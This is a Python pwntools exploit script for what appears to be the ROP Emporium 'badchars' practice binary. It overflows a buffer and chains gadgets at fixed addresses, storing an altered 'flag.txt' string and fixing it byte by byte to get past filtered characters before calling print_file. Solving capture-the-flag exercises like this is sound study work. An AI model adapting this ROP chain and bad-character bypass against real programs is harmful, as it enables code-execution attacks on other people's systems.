# banned chars: 'x', 'g', 'a', '.'

from pwn import *

def minorEdits(offset, addValue):
    addr = p64(6295592 + offset)
    addValue = p64(addValue)
    stackAligner = p64(0x00000000004004ee) # ret ;
    regSetAddr = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
    addAddr = p64(0x000000000040062c) # : add byte ptr [r15], r14b ; ret
    return stackAligner + regSetAddr + addValue + addr + stackAligner + addAddr

def main():
    chall = gdb.debug("./badchars")

    # misc
    flag = b"flag.txt"
    junk = b"B"*40
    weasleFlag = b"fk`f-twt"
    weasleKeyPayload = p64(0x0001010101000100)
    weasleKeyPayload = p64(0x000000000000ff62)
    flagWriteAddr = p64(0x601028)

    # gadgets
    stackAligner = p64(0x00000000004004ee) # ret ;
    storeString = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret;
    setHighRegisters = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret ;
    setrdi = p64(0x00000000004006a3) # pop rdi ; ret ;
    addAddr = p64(0x000000000040062c) # : add byte ptr [r15], r14b ; ret
    xorAddr = p64(0x0000000000400628) # : xor byte ptr [r15], r14b ; ret

    # functions 
    printfile = p64(0x400510)



    payload = (junk + stackAligner 
               + setHighRegisters + weasleFlag + flagWriteAddr
               + weasleKeyPayload + flagWriteAddr + stackAligner
               + storeString + minorEdits(1, 1) + minorEdits(2,1)
               + minorEdits(3,1) + minorEdits(4,1) + minorEdits(7,1)
               + stackAligner + setrdi + flagWriteAddr 
               + stackAligner + printfile)
    dummyPayload = (junk + stackAligner 
               + setHighRegisters + flag + flagWriteAddr
               + weasleKeyPayload + flagWriteAddr + stackAligner
               + storeString + stackAligner + setrdi 
               + flagWriteAddr + stackAligner + printfile)
    chall.sendafter(b"> ", payload)
    chall.interactive()

if __name__ == "__main__":
    main()